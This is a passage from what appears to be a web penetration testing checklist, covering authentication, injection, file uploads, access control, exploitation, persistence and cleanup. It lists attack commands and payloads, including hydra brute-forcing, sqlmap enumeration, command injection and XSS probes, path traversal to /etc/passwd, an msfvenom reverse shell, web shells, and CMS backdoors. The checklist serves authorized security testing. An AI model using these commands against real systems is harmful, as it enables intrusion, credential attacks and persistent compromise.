## 2. Authentication & Session Testing

- **Brute/spray:**
    
    - `hydra -l admin -P rockyou.txt target http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"`
        
- **Session handling:**
    
    - Inspect cookies for `HttpOnly`, `Secure`, `SameSite`.

## 3. Input & Injection Attacks

- **SQL Injection:**
    
    - `sqlmap -u "http://target/item.php?id=1" --batch --dbs`
        
- **Command Injection:**
    
    - Test with `;id`, `&& whoami`, backticks.
        
- **XSS:**
    
    - `<script>alert(1)</script>` in parameters, headers, or stored fields.
        
    - Use `dalfox` for automation.
        
- **Template Injection:**
    
    - `{{7*7}}`, `${7*7}` in templating engines.
        

## 4. File & Object Handling

- **File upload abuse:**
    
    - Upload `.php`, `.jsp`, `.aspx` shells.
        
    - Try polyglot files (`.jpg.php`).
        
- **Path traversal:**
    
    - `../../../../etc/passwd`
        
- **Insecure deserialization:**
    
    - Tamper with serialized cookies/JWTs.
        


## 5. Access Control & Logic Abuse

- **IDOR (Insecure Direct Object Reference):**
    
    - Change `user_id=123` â†’ `124`.
        
- **Privilege escalation:**
    
    - Access `/admin` as normal user.
        
- **Business logic flaws:**
    
    - Negative prices, skipping payment steps.
        

## 6. Exploitation & Persistence

- **Web shells:**
    
    - Drop `cmd.php` or `revshell.jsp`.
        
- **Reverse shells:**
    
    - `msfvenom -p php/meterpreter/reverse_tcp LHOST=... LPORT=...`
        
- **Pivoting:**
    
    - Use compromised web server to pivot into internal network.
        
- **Persistence:**
    
    - Add admin users in CMS.
        
    - Backdoor plugins/themes.
        

ðŸ‘‰ _Hardening note:_ file integrity monitoring, least privilege, patch CMS/plugins.

## 7. Reporting & Cleanup

- **Document findings:**
    
    - Vulnerability, PoC, impact, remediation.
        
- **Cleanup:**
    
    - Remove shells, accounts, test data.
